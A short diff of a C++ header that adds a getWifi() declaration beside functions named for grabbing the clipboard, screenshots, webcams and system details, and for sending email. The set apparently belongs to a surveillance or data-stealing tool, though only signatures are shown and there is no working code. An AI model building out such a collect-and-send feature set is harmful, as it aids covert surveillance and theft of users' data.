@@ -46,6 +46,7 @@ std::string getWinVersion();
 std::string getLanguage();
 std::string getClipboard();
 std::string getScreenshot();
+std::string getWifi();
 std::vector<std::string> getLinks();
 std::vector<std::string> getWebcams();
 void sendEmail();
